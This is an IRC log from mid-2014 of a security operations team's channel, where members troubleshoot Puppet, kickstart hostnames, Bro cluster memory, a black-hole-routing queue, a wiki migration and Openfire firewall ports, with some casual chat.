2014-06-27 13:52:54	jazoff	and this is the first time I deployed since the migration
2014-06-27 13:53:06	soehlert	ahh ok. i thought there was some deployments in between.
2014-06-27 13:53:16	jazoff	hmm, the error is coming from django
2014-06-27 13:59:33	jazoff	ooh, i think i know what I did
2014-06-27 14:02:09	jazoff	ok, was my fault :)
2014-06-27 14:02:36	soehlert	what was it?
2014-06-27 14:06:02	jazoff	accidentally overwrote the settings_local file on the server with a local version
2014-06-27 14:06:10	soehlert	ahh makes sense
2014-06-27 14:06:13	jazoff	which contains the ALLOWED_HOSTS = ['portal-sec.internal.ncsa.edu', 'portal-sec']
2014-06-27 14:06:16	jazoff	among other things
2014-06-27 14:06:19	jazoff	which causes a bad request when its missing
2014-06-27 15:21:51	soehlert	jazoff: so portal is all good? i can remove the old one?
2014-06-27 15:22:04	jazoff	can we leave it for the time being?
2014-06-27 15:22:10	jazoff	i don't think we need it but it cant hurt
2014-06-27 15:22:15	soehlert	sure. i'll leave it in the datastore but just turned off
2014-06-30 11:25:43	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-06-30 11:25:43	--	Channel #security: 6 nicks (0 ops, 0 halfops, 0 voices, 6 normals)
2014-06-30 11:25:45	--	Mode #security [+]
2014-06-30 11:25:45	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-06-30 12:01:10	jazoff	hoping the power doesn't go out
2014-06-30 12:03:01	wraquel	POwer went out this morning at my house.
2014-06-30 12:03:18	jazoff	it's dark outside and thundering
2014-06-30 12:03:31	jazoff	not much wind at least which is good
2014-06-30 12:03:33	soehlert	wait seriously wraquel?
2014-06-30 12:03:45	wraquel	yep. flickering
2014-06-30 12:03:46	wraquel	at least
2014-06-30 12:03:59	wraquel	It's been flakey since last week when the power was out for a few hours.
2014-06-30 12:04:00	soehlert	wow we had some rain but thats it
2014-06-30 12:04:52	wraquel	I have my network equip on battery backup. It's pointless though since my ISP goes out when the power goes out.
2014-06-30 12:05:04	soehlert	hah ya i found that out the hard way once
2014-06-30 12:07:12	wraquel	I was thinking of looking at this freedompop thing as a network backup and mobile hotspot. Free 500MB/mo found a few manageable catches so far.
2014-06-30 12:07:32	soehlert	i think i just ended up tethering to my phone when that happened to me
2014-06-30 12:08:21	jazoff	lightning a mile away.. eek
2014-06-30 12:08:24	wraquel	Hmmm.. Been meaning to root my phone.
2014-06-30 12:08:44	jazoff	you don't need to root to tether unless your carier sucks :)
2014-06-30 12:08:52	wraquel	My carrier is Verizon.
2014-06-30 12:08:59	jazoff	ah :)
2014-06-30 12:09:02	soehlert	nexus 5 + tmo = awesome tethering
2014-06-30 14:01:44	wraquel	Sam, you're taking SANS 560, right?
2014-06-30 14:01:55	soehlert	ya
2014-06-30 15:24:41	soehlert	jazoff: munin error when running puppet agent
2014-06-30 15:24:59	jazoff	oh?
2014-06-30 15:25:29	jazoff	this?
2014-06-30 15:25:30	jazoff	Jun 30 15:24:13 munin-sec puppet-agent[7454]: Could not retrieve catalog from remote server: Error 400 on SERVER: Another local or imported resource exists with the type and title Munin::Master::Node_definition[log;relay02-sec.ncsa.illinois.edu] on node munin-sec.internal.ncsa.edu
2014-06-30 15:25:36	soehlert	ya
2014-06-30 15:25:45	jazoff	likely from re-using the machine name..
2014-06-30 15:25:53	jazoff	do you know how to remove the old one from puppet?
2014-06-30 15:26:16	soehlert	ya i noticed jon didnt do that. i just dont know which one is the currently used one..
2014-06-30 15:26:32	jazoff	hmm
2014-06-30 15:26:44	jazoff	whichever one hasn't checked in lately i guess
2014-06-30 15:30:36	soehlert	strange there were two but one was internal and one wasnt
2014-06-30 15:30:54	soehlert	ya still problems
2014-06-30 15:35:09	jazoff	hmm
2014-06-30 15:44:15	jazoff	sigh.. internet stopped working
2014-06-30 15:46:15	jazoff	tehering is proving to be flaky from home
2014-06-30 16:04:15	jazoff	meh, i give up  for now.. maybe it will work again after a walk
2014-06-30 16:04:28	jazoff	otherwise I get to call comcast. joy.
2014-06-30 17:45:30	jazoff	well that was annoying
2014-07-01 09:58:55	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-07-01 09:58:55	--	Channel #security: 6 nicks (0 ops, 0 halfops, 0 voices, 6 normals)
2014-07-01 09:58:57	--	Mode #security [+]
2014-07-01 09:58:57	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-07-01 10:15:05	soehlert	effin microsoft...thats why my dynamic dns isn't working..
2014-07-01 10:15:07	soehlert	https://www.noip.com/blog/2014/06/30/ips-formal-statement-microsoft-takedown/
2014-07-01 10:16:37	jazoff	yeah, dyndns sucks these days
2014-07-01 10:16:48	soehlert	oh i dont use dyndns
2014-07-01 10:16:53	soehlert	as in the brand
2014-07-01 10:16:58	jazoff	ah, i mean in general
2014-07-01 10:17:03	jazoff	all the providers seem to have issues
2014-07-01 10:17:15	jazoff	i've been meaning to build something using amazons route53 dns api
2014-07-01 10:17:28	soehlert	ah. ive been a big fan of noip since ive been using it, but microsoft decided to crap all over that
2014-07-01 10:17:52	soehlert	ah thatd be cool to use that..
2014-07-01 10:17:54	jazoff	http://blog.vrypan.net/2012/12/20/dynamic-dns-with-route53/
2014-07-01 10:19:02	jazoff	script is kida poorly written, but looks like it would work
2014-07-01 10:19:59	soehlert	hmm that looks very interesting. i do have my aws account and a domain already..
2014-07-01 10:20:25	jazoff	yeah, you'd want to be sure to use IAM though and create an account that can only manage dns stuff
2014-07-01 10:20:47	jazoff	i think you can even make an account that can only update a specific record
2014-07-01 10:21:15	soehlert	well considering i havent touched my aws host in about 4 months haha
2014-07-01 11:05:55	eyrich	i use afraid DNS
2014-07-01 11:16:33	soehlert	jazoff: have you seen this? https://forge.puppetlabs.com/panaman/bro
2014-07-01 11:16:41	soehlert	just saw vlad plug it on the mailing list
2014-07-01 11:17:32	jazoff	yeah
2014-07-01 11:17:38	jazoff	i had looked at that when I wrote the one we use
2014-07-01 11:17:49	soehlert	ah ok
2014-07-01 11:17:53	jazoff	it had some good things in it but I mostly did my own thing
2014-07-01 11:18:06	soehlert	i didnt know how puppetized you actually had bro
2014-07-01 11:18:17	jazoff	oh, almost 100%
2014-07-01 11:18:29	jazoff	really jsut the myricom stuff is not in puppet
2014-07-01 11:18:34	soehlert	gotcha
2014-07-01 14:16:00	jazoff	ncsabot: traffic to 115.28.204.39
2014-07-01 14:16:06	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-07-01 14:16:10	jazoff	yay
2014-07-01 14:53:20	soehlert	wheres that ip from?
2014-07-01 14:53:27	jazoff	an email thread
2014-07-01 14:53:31	jazoff	bad news apparently
2014-07-01 14:53:54	soehlert	well if igured that...i dont see any thread with that though.
2014-07-01 14:54:04	jazoff	one of the ren-isac lists
2014-07-01 14:54:21	soehlert	ah ok
2014-07-02 10:04:11	keist	going to try and move Nagios2 over to CentOS today
2014-07-02 10:15:57	jazoff	hmm
2014-07-02 10:16:02	jazoff	puppet node deactivate xxx
2014-07-02 10:16:08	jazoff	for the 3 nodes we changed fixed teh munin problem
2014-07-02 10:16:12	jazoff	not sure if they re-activate themselves though
2014-07-02 10:17:45	jazoff	seems to be ok
2014-07-02 10:44:28	soehlert	jazoff: interesting. did you do that on squall? i wonder why puppet cert clean didnt do the trick.
2014-07-02 10:44:38	jazoff	yeah
2014-07-02 10:44:46	jazoff	i think because cert clean doesn't touch the database
2014-07-02 10:47:20	soehlert	ahhh
2014-07-02 12:46:43	soehlert	jazoff: any idea why our new servers keep becoming unresponsive in puppet?
2014-07-02 12:46:58	soehlert	there are no errors. and the date and time is the same on them as squall..
2014-07-02 12:48:14	jazoff	hmm
2014-07-02 12:48:16	jazoff	which servers?
2014-07-02 12:48:29	jazoff	oh, i see
2014-07-02 12:48:37	jazoff	is the mcollective thing not working?
2014-07-02 12:48:40	soehlert	squid-sec, portal-sec, and munin-sec are the ones im concerned with at the moment
2014-07-02 12:49:04	soehlert	it says its running
2014-07-02 12:49:07	jazoff	would be nice if it elaborated on what unresponsive means
2014-07-02 12:49:22	soehlert	"Unresponsive: This node hasnt reported to the puppet master recently; something may be wrong. The cutoff for considering a node unresponsive defaults to one hour, and can be configured in settings.yml with the no_longer_reporting_cutoff setting."
2014-07-02 12:55:26	jazoff	what protocol is this?
2014-07-02 12:55:41	jazoff	oh, i see, the latest reports are old too
2014-07-02 12:55:46	soehlert	ya
2014-07-02 12:55:50	jazoff	wonder if this has to do with the reusing the name too
2014-07-02 12:56:05	jazoff	can you try completely deleting portal-sec and see if it re-adds itself?
2014-07-02 12:56:20	soehlert	well it doesnt readd itself. you have to run the install script to add it
2014-07-02 13:18:22	soehlert	damnit. is someone overwriting the puppet license? i've installed the new one multiple times and it gets overwritten to the old one..
2014-07-02 13:19:28	jazoff	not I
2014-07-02 13:19:56	soehlert	i have a feeling its some automated thing..gonna ask puppet about it
2014-07-02 13:29:23	soehlert	whats this puppet1-sec.internal.ncsa.edu host that's trying to get into puppet?
2014-07-02 13:29:31	jazoff	no idea
2014-07-02 13:29:44	soehlert	keist? it literally just popped up..
2014-07-02 13:42:36	keist	the only thing I've done is is kickstarted a new host for nagios-console-sec
2014-07-02 13:42:55	soehlert	did you accidentally misname it in the kickstart?
2014-07-02 13:43:10	soehlert	i mean someone clearly named puppet1-sec.internal.ncsa.edu it wasnt puppet doing that itself..
2014-07-02 13:43:16	keist	nope
2014-07-02 13:44:40	jazoff	does it list an IP?
2014-07-02 13:44:57	soehlert	nope
2014-07-02 13:45:04	soehlert	just the hostname and a fingerprint
2014-07-02 13:45:07	jazoff	hmm, might be somethin in the log
2014-07-02 13:45:47	jazoff	puppetmaster.access.log:10.142.148.90 - - [02/Jul/2014:13:28:17 -0500] "GET /production/certificate_request/puppet1-sec.internal.ncsa.edu? HTTP/1.1" 404 75
2014-07-02 13:46:00	jazoff	[jazoff@fog ~]$ host 10.142.148.90
2014-07-02 13:46:01	jazoff	90.148.142.10.in-addr.arpa domain name pointer puppet1-sec.internal.ncsa.edu.
2014-07-02 13:46:01	jazoff	huh
2014-07-02 13:46:30	soehlert	thats a kickstart dhcp address
2014-07-02 13:46:56	soehlert	it doesnt respond either..
2014-07-02 13:47:43	keist	that was the IP my host recieved from DHCP for PXE. that explains it, adjust the lease range then or remove that DNS entry
2014-07-02 13:47:58	soehlert	what is that DNS entry? i never made that
2014-07-02 13:48:04	keist	nor have I
2014-07-02 13:48:08	soehlert	that dhcp address has been being passed out forever
2014-07-02 13:48:31	keist	I've never had .90 before so I can't say
2014-07-02 13:48:37	keist	until now that is
2014-07-02 13:49:45	soehlert	i just used it yesterday fine. this is weird as hell.
2014-07-02 13:49:45	soehlert	unless neteng just made this dns name..
2014-07-02 13:50:05	soehlert	but i thought puppet used the hostname and not the dns name
2014-07-02 13:52:04	keist	it doesn't seem to, because my host name is set to what I entered in the prompt i.e. nagios-console-sec
2014-07-02 13:52:50	keist	may have to rewrite that, I've always had to redo it anyway, like in the past it would show up in puppet as localhost.localdomain if I didn't put the DNS request in
2014-07-02 13:52:59	keist	further evidence that is tries to resolve
2014-07-02 13:53:17	soehlert	no it does that because the hostname doesn't always get set properly from my little hack in kickstart
2014-07-02 13:53:27	soehlert	so its hostname is still localhost.localdomain
2014-07-02 13:53:27	soehlert	until it reboots
2014-07-02 13:53:58	keist	no, the hostname for the OS is correct but not for the puppet certificate request
2014-07-02 13:54:43	soehlert	i get that. but puppet takes that (by default which my script does) from the machines hostname. i've run into a race condition on when the hostname actually is getting set vs when the puppet script tries to install
2014-07-02 13:59:32	keist	I know it needs written, can't you solve the race condition by filling out $HOSTNAME with the value suppied to $hostname
2014-07-02 14:00:40	soehlert	that's what im doing
2014-07-02 14:00:44	soehlert	sed -i -e 's#^\(HOSTNAME=\).*$#\1'"$hostname"'#' /etc/sysconfig/network                                                                                  
2014-07-02 14:01:12	soehlert	i originally tried `hostname $hostname` but that always failed
2014-07-02 14:01:17	soehlert	this way works on occasion
2014-07-02 14:01:55	keist	you're not setting it in for the currrent environment only putting it in the file
2014-07-02 14:02:33	keist	which is applied when read so it's too late as least until the next reboot
2014-07-02 14:02:55	soehlert	how would you do it in the current environment and make it persistent?
2014-07-02 14:04:10	jazoff	i think you just also need hostname $hostname
2014-07-02 14:04:17	soehlert	thats what i had before
2014-07-02 14:04:24	soehlert	it never set it at all
2014-07-02 14:04:24	soehlert	even after a reboot
2014-07-02 14:04:36	jazoff	yeah, you need both i think is what keist is saying
2014-07-02 14:04:48	jazoff	the sed to fix the config file and hostname to apply the change to the current session
2014-07-02 14:05:16	keist	exactly
2014-07-02 14:05:22	soehlert	right but i mean puppet reported localhost.localhost every time when i had it that way, which is why i changed it
2014-07-02 14:06:15	soehlert	i think the problem there is that it's lost when you reboot after the kickstart, so you lose the environment, no?
2014-07-02 14:07:18	jazoff	well changing the sysconfig file doesn't do anything until the next reboot
2014-07-02 14:07:36	soehlert	right, i get that, but the fix you guys are suggesting never does anything
2014-07-02 14:07:57	jazoff	mayyybe
2014-07-02 14:08:11	jazoff	where does the $hostname come from?
2014-07-02 14:08:15	keist	his script
2014-07-02 14:08:19	soehlert	unless i had something else negating it.
2014-07-02 14:08:26	soehlert	it failed all my tests
2014-07-02 14:08:28	keist	need to set HOSTNAME and write to a file to test 
2014-07-02 14:08:46	soehlert	by all means rewrite it, i'd love for it to work. just explaining how i got where i did
2014-07-02 14:09:25	keist	kk
2014-07-02 14:10:02	keist	i just want it to work too lol I always have to reject the certifi
2014-07-02 14:10:25	jazoff	but what sets $hostname?
2014-07-02 14:10:34	keist	his script
2014-07-02 14:10:44	soehlert	you do
2014-07-02 14:10:44	soehlert	look at modules/kickstart/templates/default.cfg.erb
2014-07-02 14:10:45	jazoff	where does it get it from?
2014-07-02 14:10:46	keist	using 'read'
2014-07-02 14:10:51	keist	user prompt
2014-07-02 14:11:46	keist	i'll fix the comment out wheel group in sudoers too becauese that's a pain
2014-07-02 14:12:06	soehlert	im not sure whats up with that
2014-07-02 14:12:06	soehlert	it worked fine for me today..
2014-07-02 14:12:09	jazoff	yeah, you are doing
2014-07-02 14:12:10	jazoff	q_puppetagent_certname=$(hostname)
2014-07-02 14:12:23	jazoff	but i think you mean $hostname
2014-07-02 14:12:36	jazoff	or ${hostname}
2014-07-02 14:12:42	jazoff	that should fix the problem
2014-07-02 14:12:51	soehlert	no because that is part of an init script. so its actually running the hostname command
2014-07-02 14:13:27	soehlert	since the hostname we give it goes away after the reboot so the init script wont have access to it
2014-07-02 14:13:27	soehlert	or at least that was my (probably flawed) thinking
2014-07-02 14:13:36	jazoff	close....
2014-07-02 14:13:42	jazoff	but i think it runs it when the file is generated
2014-07-02 14:14:07	soehlert	i was thinking the file was generated post reboot for some reason. i guess that maeks more sense then
2014-07-02 14:14:08	jazoff	[jazoff@portal-sec ~]$ sudo cat /root/answerfile|grep cer
2014-07-02 14:14:08	jazoff	q_puppetagent_certname=puppet1-sec.internal.ncsa.edu
2014-07-02 14:14:20	soehlert	portal-sec?
2014-07-02 14:14:27	soehlert	how the hell did that one just show up now?
2014-07-02 14:14:38	jazoff	i checked to see what that file looked like
2014-07-02 14:15:02	soehlert	no i mean how did it just now show up in the requesting certs part of the dashboard? i finished portal last week..
2014-07-02 14:15:30	jazoff	i don't know what you are referring to
2014-07-02 14:16:17	soehlert	so when you install a puppet agent, it sends a request to the puppuetmaster and theres a request on the dashboard. you have to accept it, then you can run puppet on it. i did that with portal sec last week (as portal-sec) so im not sure how puppet1-sec request just showed up now
2014-07-02 14:16:58	jazoff	oh, maybe the deactivate thing i did before?
2014-07-02 14:17:17	jazoff	if the relay02 shows up again too that was probably that
2014-07-02 14:17:20	soehlert	ahhh i bet thats true. i still dont know how it got a hostname of puppet1-sec, but its not important i suppose
2014-07-02 14:17:45	jazoff	DNS
2014-07-02 14:17:50	jazoff	from dhcp
2014-07-02 14:18:03	soehlert	dhcp gave it a dns name of puppet1-sec?
2014-07-02 14:18:15	jazoff	sorta
2014-07-02 14:26:43	keist	ls
2014-07-02 14:43:40	soehlert	keist: should i change the thruk console? it seems to be erroring out. did you change dns names or something? or just assume its gonna be messed up while you're moving?
2014-07-02 14:50:55	keist	ah, yeah, I'm moving it at the moment
2014-07-02 14:51:06	soehlert	all good
2014-07-02 14:54:25	soehlert	jazoff: would any of the git pulls we do on squall be overwriting the license file? it sure doesnt seem like it but i cant think of what else is doing it and support is incredulous at this..
2014-07-02 14:54:59	jazoff	not that i can think of
2014-07-02 14:55:06	jazoff	git would complain, it wouldn't overwrite it
2014-07-02 14:55:12	soehlert	ah
2014-07-02 14:55:48	soehlert	this is just so confusing then. i think im having a "fuck puppet" day..
2014-07-02 14:56:09	jazoff	heh
2014-07-02 14:58:23	-->	eyrich1 (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-07-02 15:00:02	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Ping timeout)
2014-07-02 15:02:51	jazoff	puppet isn't replacing the puppet license is it?
2014-07-02 15:02:52	jazoff	that would be weird
2014-07-02 15:02:58	keist	soehlert: probably won't have the thruk monitor console back up this week, since I can't see what it looks like on the projector lol
2014-07-02 15:03:00	jazoff	i suppose you could chattr +i it
2014-07-02 15:03:07	soehlert	haha all good keist 
2014-07-02 15:03:22	soehlert	its strangely half working anyways
2014-07-02 15:03:38	jazoff	if you open the dev console in chrome and resize the window it tells you what the size is
2014-07-02 15:03:42	soehlert	jazoff: i was wondering, but the fact that support seems confused by this suggests thats not the case
2014-07-02 15:03:43	jazoff	so you can just resize the window to match the projector
2014-07-02 15:12:57	jazoff	what's the file that is getting overwritten?
2014-07-02 15:13:26	soehlert	/etc/puppetlabs/license.key
2014-07-02 15:14:52	jazoff	/opt/puppet/share/puppet/modules/puppet_enterprise/manifests/license.pp
2014-07-02 15:15:05	jazoff	Jun 30 13:29:41 squall puppet-agent[23332]: (/Stage[main]/Puppet_enterprise::License/File[/etc/puppetlabs/license.key]/content) content changed '{md5}e964e4eb4e2f9600fb2b0933e719e5c1' to '{md5}c446896962361ea0ba1be89949b59faf'
2014-07-02 15:19:19	jazoff	so.. it would look like puppet is replacing it...
2014-07-02 15:35:30	soehlert	i figured it had to be something they did. it was seemingly changing on the hour.
2014-07-02 15:35:35	soehlert	err 1/4 hour
2014-07-02 15:35:41	soehlert	ill see what support says about that
2014-07-02 15:36:24	jazoff	it seems like you are supposed to configure the license key through the console
2014-07-02 15:36:35	jazoff	and then the puppet_enterprise module writes it out for you
2014-07-02 15:36:56	soehlert	that might be the case
2014-07-02 15:37:36	soehlert	going to verify with them
2014-07-02 15:38:29	soehlert	according to their instructions when we got the license that was definitely NOT the case, but something is amiss obviously. good find on that
2014-07-02 17:09:42	jazoff	eyrich1: http://www.ubnt.com/edgemax/edgeswitch/
2014-07-03 07:26:20	eyrich1	jazoff: I have been told to stay away from the ubiqiti networkign gear. specifically the person said the tough stuff sucks. So not sure if that applies across the lines or not.
2014-07-03 07:26:24	eyrich1	I will stick with HP
2014-07-03 07:28:12	jazoff	yeah.. I wonder who makes the asic in that
2014-07-03 09:35:37	jazoff	ah. I thought I was getting sick, but no.. the AC has just stopped blowing cold air so it's almost 90 inside
2014-07-03 10:27:31	soehlert	jazoff: whats up with the bro cluster. seeing the proxy restart a bunch
2014-07-03 10:29:04	eyrich1	I dont think we have BHd an address in July
2014-07-03 10:29:42	eyrich1	also have not received a status email latley
2014-07-03 10:31:17	eyrich1	bhlist has not updated since Jun 26
2014-07-03 10:31:26	eyrich1	jazoff: i think you uploaded code and broke
2014-07-03 10:43:11	jazoff	soehlert: i bumped the number of proxies up to 2.. expecting that to fix it
2014-07-03 10:43:17	jazoff	eyrich1: not since I was at NCSA
2014-07-03 10:43:36	jazoff	that wasn't the 26th was it? hmm
2014-07-03 10:46:59	keist	soehlert: do you remember the name of the thruk user for the projector machine? I can't remmeber what username I chose
2014-07-03 10:47:20	soehlert	thrukadmin
2014-07-03 10:48:05	keist	it was like demo or something
2014-07-03 10:50:02	soehlert	definitely logged in as thrukadmin
2014-07-03 10:51:29	jazoff	ooh, that must have been the bro upgrade
2014-07-03 10:52:02	jazoff	i thought I checked after the upgrade that it was working.. hmm
2014-07-03 10:57:41	jazoff	oh, not my fault
2014-07-03 10:57:43	jazoff	the box ran out of memory
2014-07-03 10:57:50	jazoff	vmtoolsd is using all the ram
2014-07-03 10:58:08	jazoff	postgres got killed
2014-07-03 10:58:45	soehlert	keist: do you want me to log in as another user for the projector?
2014-07-03 11:03:36	keist	ah, I didn't know that, I created that read-only user for the projector. Will use that but I have to recreate it
2014-07-03 11:03:47	soehlert	ok
2014-07-03 11:07:10	jazoff	eyrich1: ok, mostly fixed
2014-07-03 11:07:24	jazoff	restarted vmtools thing, restarted postgres
2014-07-03 11:23:15	jazoff	need to work out a way to monitor that better
2014-07-03 11:24:04	soehlert	shouldn't nagios/munin do that for us
2014-07-03 11:25:20	jazoff	it's not running on cygnus is it?
2014-07-03 11:26:13	soehlert	ahhh i thought those errors were on supercell. carry on
2014-07-03 12:27:39	keist	soehlert: turns out I had that user in puppet, err, it was called dashboard
2014-07-03 12:28:07	soehlert	ahhh gotcha
2014-07-03 12:41:37	keist	you guys playing vball this week?
2014-07-03 12:41:41	keist	tonight I mean
2014-07-03 12:41:54	soehlert	im not
2014-07-03 12:41:54	soehlert	i pulled something in my back and it kills to breathe..
2014-07-03 12:42:12	keist	ah, dang that sucks. Doing what?
2014-07-03 12:42:34	keist	I practiced serves again by myself last night for 3 hours LOL
2014-07-03 12:42:49	soehlert	No idea it just started hurting like a bitch yesterday and is just getting worse today
2014-07-03 12:42:49	soehlert	hahaha you found a court huh?
2014-07-03 12:43:19	eyrich1	thanks for fixing jazoff
2014-07-03 12:43:23	eyrich1	Activity since last digest: Blocked: 10 Unblocked: 992 :)
2014-07-03 12:43:29	keist	we have one in my home town, 3 min walk from my parents house
2014-07-03 12:43:55	jazoff	yeah...
2014-07-03 12:44:01	jazoff	may want to have that box rebooted at some point
2014-07-03 12:44:11	jazoff	and figure out if that vm stuff needs to be upgraded or something
2014-07-03 12:44:20	jazoff	and why it was using all the ram on the box
2014-07-03 12:45:29	jazoff	and maybe we should investigate getting that queuing architecture going, at least on the bro side so it can buffer BHR stuffs if cygnus is having issues again
2014-07-03 12:46:30	soehlert	keist: ahh i thought you were in NC or something?
2014-07-03 12:46:44	jazoff	I suppose I could get that going easy enough.. just need to build rpms for nsqd and run it on supercell
2014-07-03 12:59:25	<--	eyrich1 (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Quit: Leaving.)
2014-07-07 08:29:37	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-07-07 08:44:36	jazoff	eyrich: setup a BHR queue on supercell
2014-07-07 08:44:45	jazoff	so now the bro detection -> SSH command is decoupled
2014-07-07 08:45:49	eyrich	cool
2014-07-07 08:49:08	jazoff	so next time cygnus has an issue they should just get buffered on supercell until the problem is fixed
2014-07-07 09:21:55	jazoff	as well as any perl errors :)
2014-07-07 10:29:45	 *	wraquel twiddles thumbs waiting on responses from RHEL redistritbutor
2014-07-07 10:30:02	--	wraquel is now known as wardog
2014-07-07 10:30:56	eyrich	soehlert: repo-sec is turned off. What rpelced it?
2014-07-07 10:31:04	eyrich	and it wasnt being backed up t all
2014-07-07 10:31:04	soehlert	repo
2014-07-07 10:31:17	soehlert	sorry i sent you hostname not esx name
2014-07-07 10:33:44	eyrich	did you just rename or something?
2014-07-07 10:33:59	soehlert	No. New box. That's why theres a repo-sec and a repo
2014-07-07 10:34:18	eyrich	ok, veeam is not showing the new one.
2014-07-07 10:34:25	eyrich	I need to figure it out
2014-07-07 10:34:33	soehlert	i see it in esx..
2014-07-07 10:34:53	eyrich	yes I do too, but not in veeam
2014-07-07 10:54:56	soehlert	so puppet support is telling me that we updated just a single puppet provided module and thats why the license stuff is going crazy. pretty sure i know the answer to this, but did anyone update one of those modules?
2014-07-07 10:55:21	jazoff	not i
2014-07-07 10:55:49	soehlert	this guy is pissing me off. he spent way too long trying to tell me what a bash_history file was too..ugh
2014-07-07 10:57:22	soehlert	haha linuxatemyram 
2014-07-07 11:07:02	soehlert	bhr map is pretty sweet. who woulda guessed China leads the way..
2014-07-07 11:08:17	wardog	It's all those XP boxen
2014-07-07 11:10:02	jazoff	yeah, that's what I think the whole "great firewall of china" is such BS
2014-07-07 11:10:19	jazoff	they block "democracy" but can't figure out how to stop SSH scans?
2014-07-07 11:13:40	soehlert	who says they want to stop scanning
2014-07-07 15:20:34	jazoff	http://lists.centos.org/pipermail/centos-announce/2014-July/020393.html
2014-07-07 15:21:27	soehlert	saw that. gonna roll with 6.5 for now
2014-07-07 15:21:53	jazoff	works for me :)
2014-07-07 15:22:39	jazoff	ah, other than using systemd i don't think i care otherwise
2014-07-07 15:23:41	soehlert	haha well you'll have to live for a little bit
2014-07-07 15:23:41	soehlert	not a big fan of jumping to the first release ever. not to mention being in the middle of the centos transition already
2014-07-07 15:23:54	jazoff	yeah :)
2014-07-07 15:43:07	jazoff	well the new BHR queue thing seems to be working nicely
2014-07-07 15:43:26	jazoff	made a node in the wiki page for nagios to monitor the queue size
2014-07-07 15:43:42	jazoff	should be easy for me and schip to work out when he gets back
2014-07-07 15:45:59	wardog	I'm actually surprised by the speed at which they got this release out.
2014-07-07 15:46:08	wardog	6.0 took over a year
2014-07-07 15:46:19	soehlert	yaa me too
2014-07-07 15:47:45	wardog	didn't rhel buy centos or something like that?
2014-07-07 15:49:06	soehlert	they 'joined forces'
2014-07-07 15:49:22	wardog	I'm guessing that helped with the speed.
2014-07-07 15:50:47	soehlert	probably. i know they at least have an open channel between devs on the rhel side and at least a few on the centos side
2014-07-07 16:02:49	wardog	container support for 7 is cool
2014-07-07 16:04:55	soehlert	myisam or innodb? any preference?
2014-07-07 16:05:17	wardog	for mediawiki?
2014-07-07 16:05:22	soehlert	ya
2014-07-07 16:05:52	wardog	innodb
2014-07-07 16:05:56	soehlert	k
2014-07-07 16:06:30	soehlert	name for the wiki?
2014-07-07 16:06:53	wardog	uh...
2014-07-07 16:06:59	wardog	xsede-secops?
2014-07-07 16:07:03	soehlert	ok
2014-07-07 16:07:24	wardog	Also need to get openfire on this host as well
2014-07-07 16:07:36	wardog	eventually
2014-07-07 16:18:13	soehlert	right
2014-07-07 16:25:43	soehlert	wardog: ok i think the wiki is working. need to figure out how to get the content from the old one to the new one. 
2014-07-07 16:25:47	soehlert	could use some help with that
2014-07-07 16:45:30	jazoff	are they both mediawiki?
2014-07-07 16:45:56	soehlert	ya
2014-07-07 16:46:03	jazoff	can you use mysqldump?
2014-07-07 16:47:20	soehlert	oh mainly i was just saying i dont have access
2014-07-07 16:47:30	soehlert	to the old one that is. hence needing help
2014-07-07 16:49:06	jazoff	ahh
2014-07-07 22:03:45	wardog	soehlert: gotcha.  What version is on there now. I'll try to upgrade and then transfer the data over.
2014-07-07 22:04:41	wardog	7.0 is using firewalld instead of iptables.
2014-07-08 09:05:18	eyrich	I need to pull the Arista out today. Arista wants it back
2014-07-08 09:08:48	jazoff	booo
2014-07-08 09:22:25	jazoff	hmm
2014-07-08 09:22:52	jazoff	I had an email from them from the 3rd asking for more logs re: the ssl problem
2014-07-08 09:23:04	jazoff	maybe they might want us to hang onto it for more testing?
2014-07-08 09:27:59	eyrich	let me call
2014-07-08 09:29:57	jazoff	Richard Whitney is who has been emailing
2014-07-08 09:30:08	jazoff	'I have our Engineers engaged' he said
2014-07-08 09:35:39	eyrich	i tried calling, no answer, so I emailed
2014-07-08 09:35:46	eyrich	I will leave it for now.
2014-07-08 09:52:20	jazoff	ahhh, AC fixed
2014-07-08 10:55:40	eyrich	i talked to Darrin - he said keep it for now
2014-07-08 10:56:11	jazoff	ok :)
2014-07-08 10:56:25	jazoff	i haven't done much with it lately other than to test some things and send logs to arista
2014-07-08 14:52:01	wardog	soehlert: these are the open ports on blizzard. Let me see which ones need to be open to the world: 5229:7443:5269:7070:7777:9090:9091:5222:5223
2014-07-08 14:52:23	soehlert	ya thats the list i have as well.
2014-07-08 14:54:19	wardog	5223:5269:7443 should cover the public. The other ports only allow from NCSA ports.
2014-07-08 14:54:28	wardog	actually. Make that just 90912
2014-07-08 14:54:29	wardog	9091
2014-07-08 14:54:46	soehlert	wait what? only allow 9091 from NCSA?
2014-07-08 14:54:50	wardog	5223:5269:7443 world, 9091 NCSA only
2014-07-08 14:54:53	jazoff	yeah, 9090 and 9091 are the admin ports, one is http one is https
2014-07-08 14:55:02	soehlert	ok
2014-07-08 14:55:12	jazoff	7443 is the file transfer proxy which might not be needed if they dont use it to send files
2014-07-08 14:55:25	wardog	zephyr is the old xsede wiki right?
2014-07-08 14:55:25	soehlert	i though that was 7777
2014-07-08 14:55:34	soehlert	no snow is wardog
2014-07-08 14:55:36	jazoff	oh, that's 7443 then?
2014-07-08 14:55:41	soehlert	idk
2014-07-08 14:55:45	soehlert	i cant find that info
2014-07-08 14:55:45	wardog	7777 is the file transfer proxy
2014-07-08 14:55:49	jazoff	oh, that's the BOSH port
2014-07-08 14:55:51	soehlert	or what 7070 is 
2014-07-08 14:55:52	wardog	7443 is the ssl http proxy
2014-07-08 14:56:01	wardog	7070 is plain http
2014-07-08 14:56:11	jazoff	that's only needed if someone is using a javascript xmpp client
2014-07-08 14:56:20	soehlert	should i keep them in wardog?
2014-07-08 14:56:21	wardog	Might want to open 7777 to the world too
2014-07-08 14:56:23	jazoff	like sparkweb or candy or whatever
2014-07-08 14:56:55	wardog	No, cause I don't think theres a way to make the protocol force the end user to ssl
2014-07-08 14:57:08	wardog	They'll just have to connect directly to the ssl based services
2014-07-08 14:57:30	soehlert	but 7443 is an ssl based service
